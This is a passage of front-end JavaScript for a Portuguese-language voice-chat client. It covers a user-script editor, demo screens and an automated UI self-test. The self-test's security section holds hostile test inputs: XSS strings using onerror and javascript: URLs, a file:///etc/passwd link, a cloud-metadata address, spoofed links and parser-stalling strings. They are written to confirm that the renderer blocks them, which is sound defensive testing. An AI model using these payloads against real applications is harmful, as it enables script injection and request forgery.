      const row = el && el.closest ? el.closest('#tree .row.channel:not(.spacer)') : null;
      dropTargetId = row ? Number(row.dataset.id) : 0;
      applyDropTarget();
    });
    const finish = (commit) => {
      if (!drag) return;
      const d = drag;
      const target = dropTargetId;
      drag = null;
      dropTargetId = 0;
      applyDropTarget();
      document.body.classList.remove('dragging-client');
      if (d.ghost) d.ghost.remove();
      if (commit && d.active && target) moveClient(d.id, target);
    };
    document.addEventListener('mouseup', () => finish(true));
    window.addEventListener('blur', () => { if (!demoPinned) finish(false); });
  }

  // ------------------------------------------------------------------ sussurro / cutucada
  function renderWhisper() {
    const w = state.self.whisper || {};
    const el = $('whisperIndicator');
    const on = state.status === 'connected' && !!w.kind;
    el.hidden = !on;
    if (on) {
      const html = icon('whisper') + '<span>Sussurrando para ' + esc(w.name || (w.kind === 'channel' ? 'canal ' + w.id : 'cliente ' + w.id)) + ' ✕</span>';
      if (el.dataset.html !== html) { el.dataset.html = html; el.innerHTML = html; }
    }
  }

  // Cutucadas abrem uma janela só: as que chegam com ela aberta entram na
  // mesma lista (quem cutuca é o outro; dez cutucadas não viram dez janelas).
  const MAX_POKE_LINES = 20;
  let pokeDlg = null;
  function onPoke(p) {
    p = p || {};
    // com mais de uma aba, a janela diz em que servidor foi
    const where = state.tabs.length >= 2 ? String(p.server || tabName(findTab(Number(p.tab))) || '') : '';
    const text = '"' + (p.fromName || '?') + '" cutucou você' + (where ? ' em "' + where + '"' : '') + (p.message ? ': ' + p.message : '.');
    if (pokeDlg && !pokeDlg.closed) {
      const box = pokeDlg.q('.dlg-text');
      const line = document.createElement('div');
      line.textContent = String(text).replace(BIDI_RE, '');
      box.appendChild(line);
      while (box.childElementCount > MAX_POKE_LINES) box.firstElementChild.remove();
      return;
    }
    pokeDlg = openDialog({ title: 'Cutucada', cls: 'small', body: `<div class="dlg-text sel"><div>${esc(text)}</div></div>` });
  }

  // ------------------------------------------------------------------ scripts (automações do usuário)
  const SCRIPT_STATUS = { off: 'desligado', starting: 'iniciando…', running: 'rodando', error: 'parado por erro' };
  let scriptsDlg = null;

  // botão da barra: aceso enquanto houver script rodando
  function renderScriptsButton() {
    const list = window.FuritoScripts.list();
    const running = list.filter((x) => x.status === 'running').length;
    const failed = list.filter((x) => x.status === 'error').length;
    $('tbScripts').classList.toggle('fx-on', running > 0);
    $('tbScripts').title = 'Scripts (automações)' + (running ? ' — ' + running + ' rodando' : '') + (failed ? ' — ' + failed + ' com erro' : '');
  }

  function openScripts() {
    if (scriptsDlg) return scriptsDlg;
    const FS = window.FuritoScripts;
    const drafts = new Map(); // id → { name, code } editados e ainda não salvos
    let sel = '';             // script aberto no editor
    let shown = '';           // script cujo texto está nos campos
    let logSig = '';

    const dlg = openDialog({
      title: 'Scripts',
      cls: 'wide scripts',
      body:
        '<div class="scr">' +
          '<div class="scr-side">' +
            '<div class="list-box scr-list"></div>' +
            '<div class="set-row wrap">' +
              '<select class="scr-new" title="Criar um script"><option value="">Novo…</option><option value="blank">Em branco</option>' +
                '<optgroup label="Exemplos">' + FS.TEMPLATES.map((t, i) => `<option value="${i}">${esc(t.name)}</option>`).join('') + '</optgroup></select>' +
              '<button class="btn" data-act="del" type="button">Apagar</button>' +
            '</div>' +
          '</div>' +
          '<div class="scr-main">' +
            '<div class="scr-empty muted-text">Scripts são pequenas automações em JavaScript: mandar uma mensagem ou tocar um som quando alguém entra no canal, responder a comandos do bate-papo, avisar num horário…<br><br>Crie um em "Novo…" (há exemplos prontos para adaptar — "Exemplos: todas as funções" mostra tudo o que dá para fazer) e marque "Ligado" para ele começar a rodar.</div>' +
            '<div class="scr-edit" hidden>' +
              '<div class="set-row"><input type="text" class="scr-name" maxlength="60" placeholder="Nome do script" spellcheck="false" autocomplete="off">' +
                '<label class="check" title="Ligado, o script roda sempre que o app estiver aberto."><input type="checkbox" class="scr-on"> Ligado</label>' +
                '<label class="check" title="Permite que este script mova, expulse, bana e dê a palavra a outras pessoas — com as permissões que você tem no servidor."><input type="checkbox" class="scr-power"> Pode moderar</label></div>' +
              '<textarea class="scr-code" spellcheck="false" autocomplete="off" autocapitalize="off" wrap="off" data-focus></textarea>' +
              '<div class="scr-bar small"><span class="scr-status"></span><button class="btn small" data-act="clear" type="button">Limpar registro</button></div>' +
              '<div class="list-box scr-log sel"></div>' +
            '</div>' +
          '</div>' +
        '</div>' +
        '<div class="muted-text small scr-note">Um script age em seu nome no servidor: as mensagens saem como suas, e ele lê as que você recebe (inclusive as privadas). Ele roda isolado — sem acesso à internet, aos seus arquivos, ao microfone ou ao resto do app —, mas só ligue código que você entende.</div>',
      buttons: [
        { label: 'Referência…', push: true, action: () => scriptsReference() },
        { label: 'Fechar', action: () => tryClose() },
        { label: 'Salvar', primary: true, action: () => save() },
      ],
      onDismiss: () => tryClose(),
      onClose: () => { unsubscribe(); scriptsDlg = null; },
    });
    scriptsDlg = dlg;
    const q = dlg.q;

    const current = () => (sel ? FS.get(sel) : null);
    const draftOf = (sc) => drafts.get(sc.id) || { name: sc.name, code: sc.code };
    const dirty = (sc) => { const d = drafts.get(sc.id); return !!d && (d.name !== sc.name || d.code !== sc.code); };

    function renderList() {
      const list = FS.list();
      if (sel && !list.some((x) => x.id === sel)) sel = '';
      if (!sel && list.length) sel = list[0].id;
      const html = list.length ? list.map((x) =>
        `<div class="list-item${x.id === sel ? ' selected' : ''}" data-id="${esc(x.id)}" title="${esc(SCRIPT_STATUS[x.status] || '')}">` +
        `<span class="scr-dot ${esc(x.status)}"></span><span class="t">${esc(draftOf(x).name || x.name)}</span>` +
        (x.moderation ? '<span class="id-badge scr-badge" title="Este script pode mover, expulsar e banir">modera</span>' : '') +
        (dirty(x) ? '<span class="scr-mod" title="Alterações não salvas">●</span>' : '') + '</div>').join('')
        : '<div class="list-empty">Nenhum script ainda.</div>';
      const box = q('.scr-list');
      if (box.dataset.html !== html) { box.dataset.html = html; box.innerHTML = html; }
    }

    function renderLog(sc) {
      const lines = FS.logOf(sc.id);
      const last = lines[lines.length - 1];
      const sig = sc.id + ':' + lines.length + ':' + (last ? last.time + ':' + last.count : '');
      if (sig === logSig) return;
      logSig = sig;
      const box = q('.scr-log');
      const stick = box.scrollHeight - box.scrollTop - box.clientHeight < 8;
      box.innerHTML = lines.length ? lines.map((l) => {
        const d = new Date(l.time);
        return `<div class="scr-line lv-${esc(l.level)}"><span class="scr-time">${pad2(d.getHours())}:${pad2(d.getMinutes())}:${pad2(d.getSeconds())}</span> ${esc(l.text)}` +
          (l.count > 1 ? ` <span class="scr-count">×${l.count}</span>` : '') + '</div>';
      }).join('') : '<div class="list-empty">O que o script escrever com ts.log(…) e os erros dele aparecem aqui.</div>';
      if (stick) box.scrollTop = box.scrollHeight;
    }

    function renderEditor() {
      const sc = current();
      q('.scr-edit').hidden = !sc;
      q('.scr-empty').hidden = !!sc;
      q('[data-act="del"]').disabled = !sc;
      dlg.primaryBtn.disabled = !sc;
      if (!sc) { shown = ''; return; }
      if (shown !== sc.id) { // trocou de script: carrega os campos (sem pisar no que está sendo digitado)
        shown = sc.id;
        const d = draftOf(sc);
        q('.scr-name').value = d.name;
        q('.scr-code').value = d.code;
        logSig = '';
      }
      q('.scr-on').checked = sc.enabled;
      q('.scr-power').checked = sc.moderation;
      const st = q('.scr-status');
      st.className = 'scr-status ' + sc.status;
      st.textContent = (SCRIPT_STATUS[sc.status] || sc.status) + (dirty(sc) ? ' · alterações não salvas' : '');
      renderLog(sc);
    }

    const render = () => { if (!dlg.closed) { renderList(); renderEditor(); } };

    // o usuário mexeu no nome ou no código
    function touch() {
      const sc = current();
      if (!sc) return;
      drafts.set(sc.id, { name: q('.scr-name').value, code: q('.scr-code').value });
      if (!dirty(sc)) drafts.delete(sc.id);
      render();
    }

    // Salva o que está no editor (e, se pedido, muda "Ligado" ou "Pode moderar"); ligado, o script recomeça com o código novo.
    async function save(change) {
      const sc = current();
      if (!sc) return null;
      const d = draftOf(sc);
      dlg.setError('');
      try {
        const saved = await FS.save(Object.assign({ id: sc.id, name: d.name, code: d.code, enabled: sc.enabled, moderation: sc.moderation }, change || {}));
        drafts.delete(sc.id);
        if (shown === saved.id) q('.scr-name').value = saved.name;
        render();
        return saved;
      } catch (e) { dlg.setError(errText(e)); render(); return null; }
    }

    async function create(name, code) {
      const names = FS.list().map((x) => x.name);
      let n = name;
      for (let i = 2; names.includes(n); i++) n = name + ' ' + i;
      dlg.setError('');
      try {
        const saved = await FS.save({ name: n, code, enabled: false, moderation: false });
        sel = saved.id;
        render();
        q('.scr-code').focus();
      } catch (e) { dlg.setError(errText(e)); }
    }

    async function remove() {
      const sc = current();
      if (!sc) return;
      if (!(await askConfirm({ title: 'Apagar script', text: 'Apagar o script "' + sc.name + '"?', okLabel: 'Apagar', danger: true }))) return;
      try { await FS.remove(sc.id); drafts.delete(sc.id); sel = ''; render(); } catch (e) { dlg.setError(errText(e)); }
    }

    async function tryClose() {
      const pending = FS.list().filter(dirty);
      if (pending.length && !(await askConfirm({
        title: 'Scripts', okLabel: 'Descartar', danger: true,
        text: 'Há alterações não salvas em ' + pending.map((x) => '"' + x.name + '"').join(', ') + '. Descartar?',
      }))) return;
      dlg.close();
    }

    q('.scr-list').addEventListener('click', (e) => {
      const item = e.target.closest('.list-item');
      if (!item || item.dataset.id === sel) return;
      sel = item.dataset.id;
      dlg.setError('');
      render();
    });
    q('.scr-new').addEventListener('change', (e) => {
      const v = e.target.value;
      e.target.value = '';
      if (v === 'blank') create('Novo script', '// Escreva aqui. Há exemplos em "Novo…" e a lista do que dá para fazer em "Referência…".\n');
      else if (FS.TEMPLATES[Number(v)]) {
        const t = FS.TEMPLATES[Number(v)];
        FS.templateCode(t).then((code) => create(t.name, code), (err) => dlg.setError(errText(err)));
      }
    });
    q('[data-act="del"]').addEventListener('click', remove);
    q('[data-act="clear"]').addEventListener('click', () => { if (sel) FS.clearLog(sel); });
    q('.scr-on').addEventListener('change', (e) => save({ enabled: e.target.checked }));
    q('.scr-power').addEventListener('change', async (e) => {
      const sc = current();
      if (!sc) return;
      // dar esse poder a um script pede uma confirmação; tirar, não
      if (e.target.checked && !(await askConfirm({
        title: 'Permitir moderação', okLabel: 'Permitir', danger: true,
        text: 'O script "' + draftOf(sc).name + '" poderá mover, expulsar, banir e dar a palavra a outras pessoas, em seu nome, com as permissões que você tem no servidor. Permita só para código que você entende.',
      }))) { render(); return; }
      if (current() && current().id === sc.id) save({ moderation: e.target.checked });
    });
    q('.scr-name').addEventListener('input', touch);
    const code = q('.scr-code');
    code.addEventListener('input', touch);
    const insert = (text) => {
      if (!document.execCommand('insertText', false, text)) { // mantém o desfazer; se o navegador recusar, insere direto
        code.setRangeText(text, code.selectionStart, code.selectionEnd, 'end');
        touch();
      }
    };
    code.addEventListener('keydown', (e) => {
      if ((e.metaKey || e.ctrlKey) && !e.altKey && e.key.toLowerCase() === 's') { e.preventDefault(); save(); return; }
      if (e.isComposing || e.metaKey || e.ctrlKey || e.altKey) return;
      if (e.key === 'Tab' && !e.shiftKey) { e.preventDefault(); insert('  '); }
      else if (e.key === 'Enter') { // a linha nova começa com o recuo da atual
        const before = code.value.slice(0, code.selectionStart);
        const indent = /^[ \t]*/.exec(before.slice(before.lastIndexOf('\n') + 1))[0];
        if (indent) { e.preventDefault(); insert('\n' + indent); }
      }
    });

    const unsubscribe = FS.onChange(render);
    render();
    return dlg;
  }

  function scriptsReference() {
    const section = ([title, rows]) => `<div class="scr-ref-title">${esc(title)}</div><table class="scr-ref-table">` +
      rows.map(([sig, text]) => `<tr><td><code>${esc(sig)}</code></td><td>${esc(text)}</td></tr>`).join('') + '</table>';
    return openDialog({
      title: 'Scripts — referência',
      cls: 'wide scripts-ref',
      body: '<div class="scr-ref sel">' +
        '<p>Um script é JavaScript que fica rodando enquanto estiver ligado. Ele reage ao que acontece no servidor com <code>ts.on(…)</code> e age pelo objeto <code>ts</code>:</p>' +
        `<pre>${esc("ts.on('clientJoined', (e) => {\n  ts.sendChannelMessage('Bem-vindo, ' + e.client.nickname + '!');\n});")}</pre>` +
        window.FuritoScripts.REFERENCE.map(section).join('') +
        '<div class="scr-ref-title">Limites</div>' +
        '<p>Mensagens, cutucadas e moderação: até 4 ações seguidas, depois uma a cada 5 segundos (o servidor bloqueia quem manda comandos demais). As suas próprias mensagens não disparam <code>message</code>. ' +
        'As ações de moderação contam no mesmo limite e ficam anotadas no registro do servidor. ' +
        'O script não acessa a internet, arquivos nem o resto do app, e é encerrado se parar de responder (um laço sem fim, por exemplo).</p>' +
        '</div>',
    });
  }

  // ------------------------------------------------------------------ demonstração (somente modo mock)
  let demoPinned = false; // mantém popovers abertos para capturas de tela no modo demonstração
  function runDemo(name) {
    demoPinned = true;
    document.documentElement.classList.add('no-anim');
    const row = (type, id) => $('tree').querySelector(`.row[data-type="${type}"][data-id="${id}"]`);
    switch (name) {
      case 'dialog': openConnectDialog(); break;
      case 'newtab': openConnectDialog({ newTab: true }); break; // conectado: o diálogo oferece "Em nova aba"
      case 'error': openConnectDialog().then(() => { $('cHost').value = 'erro.exemplo.com'; submitConnect(); }); break;
      case 'client': select('client', 3, true); break;
      case 'channel': select('channel', 3, true); break;
      case 'server': select('server', 0, true); break;
      case 'capture': showPopover($('popCapture'), $('tbCapture')); break;
      case 'soundboard': showPopover($('popSoundboard'), $('tbSoundboard')); break;
      case 'effects': run('SetEffect', ['robot']).then(() => showPopover($('popEffects'), $('tbEffects'))); break;
      case 'emoji': showPopover($('popEmoji'), $('emojiBtn')); break;
      case 'private': openPrivateChat(3); run('SendText', [1, 3, 'opa, tudo certo?']); break;
      case 'password': joinChannel(5); break;
      case 'ctx': { const r = row('client', 4); if (r) { const b = r.getBoundingClientRect(); select('client', 4, true); showContextMenu(b.left + 60, b.bottom, [{ label: 'Abrir bate-papo de texto', action() {} }]); } break; }
      case 'muted': run('ToggleMute'); run('ToggleDeafen'); run('SetAway', [true, 'já volto']); break;
      case 'collapse': collapsed.add(3); renderTree(); select('channel', 8, true); break;
      // recursos novos
      case 'settings': openSettings(new URLSearchParams(location.search).get('pane') || 'audio'); break; // &pane=hotkeys|connection|privacy|screen|identities
      case 'about': openAbout(); break;
      case 'hotkey': openSettings('hotkeys'); captureHotkey('ptt', 'Apertar para falar'); break;
      case 'bookmarks': showMenu(bookmarksMenu(), $('tbBookmarks')); break;
      case 'bookmarksdlg': openBookmarks(); break;
      case 'clientmenu': case 'groupsmenu': case 'selfmenu': {
        const id = name === 'selfmenu' ? state.self.clientId : 4;
        const r = row('client', id);
        if (!r) break;
        const b = r.getBoundingClientRect();
        select('client', id, true);
        showContextMenu(b.left + 60, b.bottom, clientMenu(findClient(id)));
        if (name === 'groupsmenu') { const w = $('ctxMenu').querySelector('.menu-sub-wrap'); if (w) w.dispatchEvent(new MouseEvent('mouseenter')); }
        break;
      }
      case 'channelmenu': { const r = row('channel', 3); if (r) { const b = r.getBoundingClientRect(); select('channel', 3, true); showContextMenu(b.left + 60, b.bottom, channelMenu(findChannel(3))); } break; }
      case 'servermenu': { const r = row('server', 0); if (r) { const b = r.getBoundingClientRect(); showContextMenu(b.left + 60, b.bottom, serverMenu()); } break; }
      case 'chanedit': select('channel', 3, true); channelEditor(findChannel(3), 0); break;
      case 'chancreate': channelEditor(null, 3); break;
      case 'perms': openPermissions(); break;
      case 'files': openFiles(findChannel(3)); break;
      case 'ban': banDialog(findClient(5)); break;
      case 'kick': kickClient(findClient(5), true); break;
      case 'volume': volumeDialog(findClient(5)); break;
      case 'poke': onPoke({ fromName: 'Zé Pequeno', message: 'bora jogar?' }); break;
      case 'away': toggleAway(); break;
      case 'confirm': deleteChannel(findChannel(6)); break;
      case 'whisper': run('SetWhisperTarget', ['channel', 3]); break;
      case 'history': activateTab('channel'); break;
      case 'serverinfo': select('server', 0, true); break;
      case 'clientinfo': select('client', 5, true); break;
      case 'ptt': run('SetVADMode', ['ptt']).then(() => showPopover($('popCapture'), $('tbCapture'))); break;
      case 'drag': {
        const a = row('client', 5), b = row('channel', 6);
        if (!a || !b) break;
        const ra = a.getBoundingClientRect(), rb = b.getBoundingClientRect();
        a.dispatchEvent(new MouseEvent('mousedown', { bubbles: true, button: 0, clientX: ra.left + 50, clientY: ra.top + 8 }));
        document.dispatchEvent(new MouseEvent('mousemove', { bubbles: true, clientX: rb.left + 70, clientY: rb.top + 9 }));
        break;
      }
      case 'screen': call('AcceptScreenWarning').then(() => api._mockPeerShare(true)).then(() => setTimeout(() => watchScreen(3), 300)); break; // assistindo à tela do outro cliente simulado
      case 'screenshare': call('AcceptScreenWarning').then(() => shareScreenDialog()); break;
      case 'recording': run('ToggleRecording'); break;
      case 'reconnect': break; // o estado "reconectando" vem do backend simulado
      case 'scripts': // a janela de scripts com um rodando, um parado por erro e um desligado
        (async () => {
          const FS = window.FuritoScripts, T = FS.TEMPLATES;
          const first = await FS.save({ name: T[0].name, code: T[0].code + "\nts.log('pronto: esperando alguém entrar no canal');\n", enabled: true });
          await FS.save({ name: 'Com erro', code: "ts.on('clientJoined', (e) => {\n  ts.sendChannelMessage('oi'\n});\n", enabled: true });
          await FS.save({ name: T[2].name, code: T[2].code, enabled: false });
          await FS.save({ name: T[4].name, code: T[4].code, enabled: true, moderation: true });
          setTimeout(() => call('_mockVisitor', true), 600);
          openScripts().q('.list-item[data-id="' + first.id + '"]').click();
        })();
        break;
      case 'tabs': // duas abas (ou ?n=3…8): a mais nova à vista; a primeira com o microfone, gente falando e uma mensagem não lida
        (async () => {
          const first = state.tab;
          const n = clamp(Number(new URLSearchParams(location.search).get('n')) || 2, 2, 8);
          for (let k = 2; k <= n; k++) {
            const before = state.tab;
            await call('ConnectNewTab', { host: k === 2 ? 'escritorio.exemplo.com' : 'outro-' + k + '.exemplo.com', nickname: state.self.nickname });
            for (let i = 0; i < 100 && !(state.tab !== before && state.status === 'connected' && !chatLoading); i++) await new Promise((r) => setTimeout(r, 50));
          }
          await callOn(first, '_mockSay', 3, 'voltei, alguém aí?');
          select('channel', 3, true);
        })();
        break;
      case 'selftest': selfTest(row); break;
      default: break;
    }
  }

  // teste automático da UI contra o backend simulado (?mock&demo=selftest); resultado aparece no aviso do topo
  async function selfTest(row) {
    const out = [];
    const wait = (ms) => new Promise((r) => setTimeout(r, ms));
    const fire = (el, type, extra) => el.dispatchEvent(new MouseEvent(type, Object.assign({ bubbles: true, cancelable: true, button: 0, clientX: 80, clientY: 200 }, extra || {})));
    try {
      fire(row('channel', 6), 'mousedown');
      out.push('sel=' + selection.type + ':' + selection.id);
      const before = row('channel', 6);
      fire(before, 'dblclick');
      await wait(60);
      out.push('joined=' + state.self.channelId + ' tab=' + tabs.get('channel').label);
      fire(row('channel', 5), 'dblclick');
      out.push('pwDialog=' + !$('dlgPassword').hidden);
      $('pwInput').value = '1234';
      $('pwOk').click();
      await wait(60);
      out.push('joinedPw=' + state.self.channelId);
      fire(row('client', 4), 'contextmenu', { button: 2 });
      out.push('ctx=' + !$('ctxMenu').hidden);
      $('ctxMenu').querySelector('.menu-item').click();
      out.push('active=' + activeTab);
      $('chatInput').value = 'oi <b>x</b> [b]neg[/b]';
      $('chatInput').dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true, cancelable: true }));
      await wait(1100);
      const view = tabs.get(activeTab).view;
      out.push('lines=' + view.childElementCount + ' html=' + (view.innerHTML.includes('&lt;b&gt;x&lt;/b&gt; <b>neg</b>') ? 'escaped' : 'UNESCAPED'));
      activateTab('server');
      await call('SendText', 1, 4, 'de novo');
      await wait(1100);
      out.push('unread=' + tabs.get('p:4').unread);
      $('tbMute').click(); await wait(20);
      out.push('mute=' + $('tbMute').classList.contains('active'));
      $('tbRecord').click(); await wait(30);
      out.push('rec=' + ($('tbRecord').classList.contains('active') && /^\d+:\d\d$/.test($('tbRecordTime').textContent) && state.self.recordingSince > 0 ? 'ok' : 'FAIL'));
      $('tbRecord').click(); await wait(30);
      out.push('recStop=' + (!$('tbRecord').classList.contains('active') && $('tbRecordTime').textContent === '' && !state.self.recordingSince ? 'ok' : 'FAIL'));
      fire(row('channel', 3).querySelector('.chev'), 'mousedown');
      out.push('collapsed=' + (row('channel', 4) === null));

      // ---- recursos do dia a dia e de administração
      const chk = (name, cond, detail) => out.push(name + '=' + (cond ? 'ok' : 'FAIL' + (detail !== undefined ? '(' + detail + ')' : '')));
      const topDlg = () => openModals[openModals.length - 1];

      // ---- segurança: textos escritos por outras pessoas
      {
        const frag = (html) => { const d = document.createElement('div'); d.innerHTML = html; return d; };
        const EVIL = 'https://evil.example/x.png';
        // registro: um apelido com BBCode não vira imagem, link nem formatação
        const logLine = frag(logHtml('[b]"[img]' + EVIL + '[/img][url=' + EVIL + ']clique[/url][color=red]x[/color]"[/b] conectou ao canal\nlinha falsa'));
        chk('secLogIsPlain', !logLine.querySelector('img, a, span, br, button') && logLine.querySelectorAll('b').length === 1 &&
          logLine.textContent.includes('[img]' + EVIL + '[/img]') && logLine.textContent.includes('conectou ao canal linha falsa'), logLine.innerHTML);
        appendMessage({ id: 0, time: Date.now(), kind: 'log', level: 'info', text: '[b]"[img]' + EVIL + '[/img]"[/b] conectou ao canal', targetMode: 0 });
        const srvLast = tabs.get('server').view.lastElementChild;
        chk('secLogLineInDom', !srvLast.querySelector('img, a[data-url], .img-ph') && srvLast.textContent.includes('[img]'), srvLast.innerHTML);
        // conversa: [img] nunca carrega sozinho (vira o endereço); links não têm href
        const chatLine = frag(bbcode('veja [img]' + EVIL + '[/img] e [url=' + EVIL + ']isto[/url] <img src=x onerror=alert(1)>', CHAT_BB));
        const chatLinks = Array.from(chatLine.querySelectorAll('a'));
        chk('secChatNoImages', !chatLine.querySelector('img, .img-ph') && chatLinks.length === 2 && chatLinks.every((a) => a.dataset.url === EVIL && !a.hasAttribute('href') && !a.hasAttribute('target')), chatLine.innerHTML);
        // descrições: marcador à espera de clique; com a política 'auto', a imagem
        const ph = frag(bbcode('[img]' + EVIL + '[/img]', { images: 'click' }));
        const auto = frag(bbcode('[img]' + EVIL + '[/img]', { images: 'auto' }));
        chk('secImageClickToLoad', !ph.querySelector('img') && !!ph.querySelector('button.img-ph') && ph.querySelector('.img-ph').dataset.img === EVIL &&
          ph.textContent.includes('evil.example') && auto.querySelectorAll('img.bb-img').length === 1, ph.innerHTML);
        // endereços da rede local nunca viram imagem, em nenhuma política
        const lan = ['http://192.168.0.1/a.png', 'http://127.0.0.1:8080/a', 'http://localhost/a', 'http://10.1.2.3/a', 'http://[::1]/a', 'http://169.254.169.254/a',
          'http://2130706433/a', 'http://0x7f.1/a', 'http://roteador/a', 'http://impressora.local/a', 'http://172.20.0.1/a', 'http://100.64.0.1/a'];
        const lanBad = lan.filter((u) => frag(bbcode('[img]' + u + '[/img]', { images: 'auto' })).querySelector('img, .img-ph'));
        chk('secNoLanImages', lanBad.length === 0 && publicImageUrl('https://i.imgur.com/a.png') && publicImageUrl('http://8.8.8.8/a.png'), lanBad.join(' '));
        // endereços que não são http/https não viram link nem imagem
        const schemes = ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>', 'file:///etc/passwd', 'ts3server://x', 'wails://wails/', '//evil.example/x', 'vbscript:x', 'blob:x'];
        const schemeBad = schemes.filter((u) => frag(bbcode('[url=' + u + ']a[/url] [img]' + u + '[/img] [url]' + u + '[/url]', { images: 'auto' })).querySelector('a, img, .img-ph'));
        chk('secOnlyHttpLinks', schemeBad.length === 0, schemeBad.join(' '));
        // um link cujo texto é o endereço de outro site mostra o destino verdadeiro
        const spoof = frag(bbcode('[url=https://evil.example/login]https://www.teamspeak.com/login[/url] [url=https://a.example/x]a.example[/url]'));
        chk('secLinkShowsRealHost', spoof.querySelectorAll('.lnk-real').length === 1 && spoof.querySelector('.lnk-real').textContent.includes('evil.example'), spoof.innerHTML);
        // nada de HTML ou CSS de fora: só as tags e atributos que o app escreve
        const hostile = '[color=red;background:url(' + EVIL + ')]a[/color][size=99999]b[/size][constructor]c[/constructor][b onclick=alert(1)]d[/b]' +
          '[url=https://a.example/"onmouseover="alert(1)]e[/url][img]https://a.example/x.png" onerror="alert(1)[/img]<script>alert(1)</script>\u202Egnp.exe';
        const hd = frag(bbcode(hostile, { images: 'auto' }));
        const attrs = new Set();
        hd.querySelectorAll('*').forEach((el) => Array.from(el.attributes).forEach((a) => attrs.add(el.tagName.toLowerCase() + '.' + a.name)));
        const allowedAttrs = ['span.style', 'span.class', 'a.class', 'a.data-url', 'a.role', 'a.tabindex', 'a.title', 'img.class', 'img.src', 'img.alt', 'img.loading', 'img.referrerpolicy'];
        const badAttrs = Array.from(attrs).filter((a) => allowedAttrs.indexOf(a) === -1);
        chk('secNoForeignMarkup', badAttrs.length === 0 && !hd.querySelector('script') && !/undefined/.test(hd.textContent) && !/\u202E/.test(hd.innerHTML) &&
          Array.from(hd.querySelectorAll('span[style]')).every((el) => /^(color:[#a-z0-9]+|font-size:\d+px)$/i.test(el.getAttribute('style'))), badAttrs.join(' ') + ' | ' + hd.innerHTML.slice(0, 300));
        // textos feitos para travar o analisador são tratados em tempo curto
        const slow = [
          'http://a/' + '!'.repeat(200000) + 'x',
          '[a='.repeat(70000),
          '[url]'.repeat(40000),
          '[url]a[/x'.repeat(20000),
          '[img]'.repeat(20000) + '[/img]',
          ('[b]'.repeat(50) + 'x').repeat(2000),
        ];
        const t0 = performance.now();
        slow.forEach((t) => { bbcode(t, { images: 'click', max: 1 << 20 }); logHtml(t); plainHtml(t); });
        const took = Math.round(performance.now() - t0);
        chk('secParserIsFast', took < 1500, took + ' ms');
        // e o texto tratado tem tamanho limitado
        chk('secTextIsClipped', bbcode('a'.repeat(100000), CHAT_BB).length < 9000 && logHtml('a'.repeat(100000)).length < 2100);
        // o painel: imagens da descrição à espera de clique, até o usuário liberar
        select('channel', 3, true);
        const infoEl = $('info');
        for (let i = 0; i < 60 && !infoEl.querySelector('.desc .img-ph, .desc img'); i++) await wait(50); // a descrição chega um instante depois
        const phs = infoEl.querySelectorAll('.img-ph').length;
        if (!phs) throw new Error('a descrição do canal 3 não mostrou marcadores de imagem: ' + infoEl.innerHTML.slice(0, 300));
        chk('secPanelAsksFirst', state.images.mode === 'ask' && !state.images.trusted && phs >= 1 && !infoEl.querySelector('.desc img:not(.avatar)') && !!infoEl.querySelector('[data-act="img-trust"]'), phs);
        fire(infoEl.querySelector('.img-ph'), 'click');
        await wait(40);
        chk('secPanelClickLoadsOne', infoEl.querySelectorAll('.desc img.bb-img').length === 1 && infoEl.querySelectorAll('.img-ph').length === phs - 1);
        fire(infoEl.querySelector('[data-act="img-trust"]'), 'click');
        await wait(80);
        chk('secPanelTrustLoadsAll', state.images.trusted === true && infoEl.querySelectorAll('.img-ph').length === 0 && infoEl.querySelectorAll('.desc img.bb-img').length === phs && !!infoEl.querySelector('[data-act="img-untrust"]'));
        fire(infoEl.querySelector('[data-act="img-untrust"]'), 'click');
        await wait(80);
        chk('secPanelUntrust', state.images.trusted === false && infoEl.querySelectorAll('.img-ph').length === phs - 1);
        await call('SetRemoteImages', 'never');
        await wait(60);
        chk('secPanelNever', !infoEl.querySelector('.desc img:not(.avatar), .img-ph') && infoEl.querySelectorAll('.desc a.lnk').length >= phs);
        await call('SetRemoteImages', 'ask');
        await wait(60);
        // um clique num link não navega a janela, nem com o botão do meio
        const anyLink = infoEl.querySelector('.desc a.lnk[data-url]');
        const opened = [];
        const realOpen = bridge.openURL;
        bridge.openURL = (u) => { opened.push(u); };
        const c1 = anyLink ? fire(anyLink, 'click') : true;
        const c2 = anyLink ? !anyLink.dispatchEvent(new MouseEvent('auxclick', { bubbles: true, cancelable: true, button: 1 })) : false;
        bridge.openURL = realOpen;
        chk('secLinkOpensOutside', !!anyLink && c1 === false && c2 === true && opened.length === 1 && /^https?:\/\//.test(opened[0]) && !anyLink.hasAttribute('href'), opened.join(' '));
        // cutucadas seguidas não empilham janelas
        const modalsBefore = openModals.length;
        for (let i = 0; i < 30; i++) onPoke({ fromName: 'Chato' + i, message: 'ei' });
        const pk = topDlg();
        chk('secPokesCoalesce', openModals.length === modalsBefore + 1 && pk.querySelectorAll('.dlg-text > div').length === MAX_POKE_LINES && pk.textContent.includes('Chato29'), openModals.length - modalsBefore);
        pk.querySelector('.dlg-foot button').click();
        await wait(20);
        // conversas privadas de muita gente não criam abas sem limite
        for (let i = 0; i < 60; i++) appendMessage({ id: 0, time: Date.now(), kind: 'chat', targetMode: 1, peerId: 9000 + i, peerName: 'Spam' + i, invokerName: 'Spam' + i, text: 'oi' });
        const privTabs = tabOrder.filter((k) => tabs.get(k).kind === 'private').length;
        chk('secPrivateTabsBounded', privTabs <= MAX_PRIVATE_TABS + 1, privTabs);
        tabOrder.filter((k) => /^p:9\d\d\d$/.test(k)).forEach((k) => closeTab(k));
        select('server', 0, true);
      }
      const key = (type, code, extra) => document.dispatchEvent(new KeyboardEvent(type, Object.assign({ key: code, code, bubbles: true, cancelable: true }, extra || {})));
      collapsed.delete(3); renderTree();
      $('tbMute').click(); await wait(20);

      // menu de contexto do cliente, com submenus de grupos
      fire(row('client', 4), 'contextmenu', { button: 2 });
      const labels = Array.from($('ctxMenu').querySelectorAll(':scope > .menu-item, :scope > .menu-sub-wrap > .menu-item')).map((b) => b.textContent);
      chk('menu', labels.length >= 12 && labels.some((l) => l.indexOf('Banir') === 0) && labels.some((l) => l.indexOf('Cutucar') === 0), labels.length);
      chk('submenu', $('ctxMenu').querySelectorAll('.submenu .menu-item').length === 8, $('ctxMenu').querySelectorAll('.submenu .menu-item').length);
      closePopover();
      fire(row('channel', 3), 'contextmenu', { button: 2 });
      chk('chMenu', $('ctxMenu').textContent.includes('Arquivos do canal') && $('ctxMenu').textContent.includes('Editar canal'));
      closePopover();
